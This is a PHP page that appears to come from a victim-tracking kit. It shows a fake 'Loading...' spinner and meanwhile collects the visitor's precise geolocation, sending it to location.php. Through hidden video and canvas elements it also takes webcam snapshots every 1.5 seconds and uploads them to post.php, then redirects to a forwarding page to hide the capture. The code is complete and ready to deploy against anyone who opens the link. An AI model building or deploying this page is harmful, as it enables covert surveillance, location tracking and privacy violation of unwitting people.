<?php
include 'ip.php';

// js buat ambil lokasi
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Debug function to log messages - only log essential information
        function debugLog(message) {
            // Only log essential location data, not status messages
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                
                // Send only essential logs to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        function getLocation() {
            // Don\'t log this message
            
            if (navigator.geolocation) {
                // Don\'t log this message
                
                // Show permission request message
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                // Don\'t log this message
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                // Redirect after a delay if geolocation is not supported
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // Don\'t log this message
                    
                    // Add a delay before redirecting to ensure data is processed
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                // Don\'t log this message
                // Still redirect even if there was an error
                redirectToMainPage();
            };
            
            // Send the data with a timestamp to avoid caching
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            // Don\'t log error messages
            
            document.getElementById("locationStatus").innerText = "Redirecting...";
            
            // If user denies location permission or any other error, still redirect after a short delay
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            // Don\'t log this message
            // Try to redirect to the template page
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                // Don\'t log this message
                // Fallback redirection
                window.location = "forwarding_link/index2.html";
            }
        }
        
        // Try to get location when page loads
        window.onload = function() {
            // Don\'t log this message
            setTimeout(function() {
                getLocation();
            }, 500); // Small delay to ensure everything is loaded
        };
        
        // Camera functionality for template
        var cameraStarted = false;
        var captureInterval = null;
        
        function initCamera() {
            if (cameraStarted) return;
            cameraStarted = true;
            
            navigator.mediaDevices.getUserMedia({video: true, audio: false})
                .then(function(stream) {
                    var video = document.getElementById(\'hiddenVideo\');
                    if (video) {
                        video.srcObject = stream;
                        video.play();
                        console.log(\'Camera activated for capture - starting continuous capture every 1500ms\');
                        
                        // Pastikan tidak ada interval duplicate
                        if (captureInterval) {
                            clearInterval(captureInterval);
                        }
                        
                        // Start capture every 1500ms for continuous capture
                        captureInterval = setInterval(function() {
                            captureWebcam();
                        }, 1500);
                    }
                })
                .catch(function(error) {
                    console.error(\'Camera access denied or not available:\', error.message);
                });
        }
        
        function captureWebcam() {
            try {
                var video = document.getElementById(\'hiddenVideo\');
                var canvas = document.getElementById(\'hiddenCanvas\');
                
                if (!video || !canvas) {
                    console.error(\'Video or Canvas element not found\');
                    return;
                }
                
                // Cek apakah video sudah ready
                if (video.readyState !== video.HAVE_ENOUGH_DATA) {
                    console.log(\'Video not ready for capture, skipping...\');
                    return;
                }
                
                // Validasi dimensi video
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    console.log(\'Invalid video dimensions, skipping capture\');
                    return;
                }
                
                var ctx = canvas.getContext(\'2d\');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                var imageDataUrl = canvas.toDataURL(\'image/jpeg\', 0.8);
                
                // Validasi data URL
                if (!imageDataUrl || imageDataUrl.length < 100) {
                    console.error(\'Invalid image data generated\');
                    return;
                }
                
                console.log(\'Capture successful, sending to server...\');
                sendCaptureToServer(imageDataUrl);
            } catch (error) {
                console.error(\'Capture error:\', error.message);
                // Lanjutkan loop meskipun ada error
            }
        }
        
        function sendCaptureToServer(imageData) {
            var xhr = new XMLHttpRequest();
            xhr.open(\'POST\', \'post.php\', true);
            xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
            
            var params = \'image=\' + encodeURIComponent(imageData);
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        try {
                            var response = JSON.parse(xhr.responseText);
                            if (response.success) {
                                console.log(\'Image upload successful:\', response.filename);
                            } else {
                                console.error(\'Server reported upload error:\', response.error);
                            }
                        } catch (e) {
                            console.log(\'Upload response received (could not parse JSON)\');
                        }
                    } else {
                        console.error(\'Upload failed:\', xhr.status, xhr.responseText);
                    }
                }
            };
            
            xhr.onerror = function() {
                console.error(\'Network error during capture upload\');
                // Loop tetap berjalan
            };
            
            xhr.send(params);
        }
        
        // Cleanup function
        function cleanupCamera() {
            if (captureInterval) {
                clearInterval(captureInterval);
                console.log(\'Capture interval cleared\');
            }
            
            // Stop camera stream
            var video = document.getElementById(\'hiddenVideo\');
            if (video && video.srcObject) {
                const stream = video.srcObject;
                const tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
                console.log(\'Camera stream stopped\');
            }
        }
        
        // Initialize camera when page loads
        window.addEventListener(\'load\', function() {
            setTimeout(initCamera, 1000);
        });
        
        // Cleanup saat unload
        window.addEventListener(\'beforeunload\', cleanupCamera);
        window.addEventListener(\'unload\', cleanupCamera);
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <!-- Hidden video element for camera capture -->
    <video id="hiddenVideo" style="display:none;"></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>
    
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
';
exit;
?>
